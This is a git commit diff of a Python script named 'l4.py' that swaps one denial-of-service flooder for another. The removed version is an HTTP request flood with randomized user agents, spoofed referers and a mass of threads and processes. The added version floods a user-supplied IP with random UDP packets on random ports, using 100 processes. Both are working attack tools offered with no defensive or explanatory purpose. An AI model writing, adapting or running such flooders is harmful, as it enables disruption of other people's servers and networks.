d0b0bdf4d3c4f4aecbf997eb670c86922721fbcc
KLVSPL <101648648+KLVSPL@users.noreply.github.com>
2022-05-12 21:04:03 +0800

    Update l4.py

--- l4.py
+++ l4.py
@@ -1,146 +1,27 @@
-import random
 import socket
+import random
 import threading
-import ssl
-import multiprocessing
-import requests
-import sys
 import time
+import multiprocessing
 
-ip = ""
-port = 80
-period = 10
-url = "//?=" + str(random.randint(0,200))
-for n,args in enumerate(sys.argv):
-    if args=="-i":
-        ip = str(sys.argv[n+1])
-    if args=="-p":
-        port = int(sys.argv[n+1])
-    if args=="-url":
-        url = str(sys.argv[n+1])
+ip = input("[IP]:")
+period = int(input("[TIMER]:"))
 
-Choice = random.choice
-
-useragents = [
-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
-"Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
-"Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
-"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
-"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
-"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"
-]
-acceptall = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
-		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
-		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
-		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
-		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
-		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
-		"Accept: text/html, application/xhtml+xml",
-		"Accept-Language: en-US,en;q=0.5\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
-		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
-
-referers = [
-	"https://www.google.com/search?q=",
-	"https://check-host.net/",
-	"https://www.facebook.com/",
-	"https://www.youtube.com/",
-	"https://www.fbi.com/",
-	"https://www.bing.com/search?q=",
-	"https://r.search.yahoo.com/",
-	"https://www.cia.gov/index.html",
-	"https://vk.com/profile.php?redirect=",
-	"https://www.usatoday.com/search/results?q=",
-	"https://help.baidu.com/searchResult?keywords=",
-	"https://steamcommunity.com/market/search?q=",
-	"https://www.ted.com/search?q=",
-	"https://play.google.com/store/search?q=",
-	"https://www.qwant.com/search?q=",
-	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-	"https://www.google.ad/search?q=",
-	"https://www.google.ae/search?q=",
-	"https://www.google.com.af/search?q=",
-	"https://www.google.com.ag/search?q=",
-	"https://www.google.com.ai/search?q=",
-	"https://www.google.al/search?q=",
-	"https://www.google.am/search?q=",
-	"https://www.google.co.ao/search?q=",
-]
-
-cookie_list = ""
-
-def rqheader():
-    connection = "Connection: Keep-Alive\r\n"
-    accept = Choice(acceptall)
-    referer = "Referer: "+Choice(referers) + ip + "\r\n"
-    useragent = "User-Agent: " + Choice(useragents) + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length = "Content-Length: 0 \r\n"
-    cookies = "Cookie:" + cookie_list + "\r\n"
-    header =  referer + useragent + accept + cookies + content + length + connection + "\r\n"
-    return header
+timeout = time.time()+1*period
 
 def attack():
-    header = rqheader()
-    go.wait()
-    while True:
-        get_host = "GET " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-        request = get_host + header
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
-
-        if port == 443:
-            ctx = ssl.SSLContext()
-            x = ctx.wrap_socket(s,server_hostname=ip)
-            try:
-                for i in range (100):
-                    x.send(str.encode(request))
-            except:
-                x.close()
-                try:
-                    for i in range(100):
-                        x.send(str.encode(request))
-                except:
-                    x.close()
-
+    Bytes = random._urandom(1024)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    while time.time()<timeout:
+        dport = random.randint(22, 55500)
+        addr = (ip,dport)
         try:
-            for e in range(100):
-                s.send(str.encode(request))
+            for _ in range(100):
+                s.sendto(Bytes*random.randint(10, 20), addr)
         except:
             s.close()
-            try:
-                for e in range(100):
-                    s.send(str.encode(request))
-            except:
-                s.close()
 
-def build_thread():
-	for _ in range(100):
-		bth = threading.Thread(target=attack)
-		bth.start()
-
-def build_process(process_num):
-	for y in range(process_num):
-		th = multiprocessing.Process (target=build_thread)
-		go.clear()
-		go.set()
-		th.start()
-
-go = threading.Event()
-build_process(100)
-print("[ATTACKING!!!]")
-time.sleep(period)
+print("Attack Started")
+for x in range(100):
+    th = multiprocessing.Process (target=attack)
+    th.start()
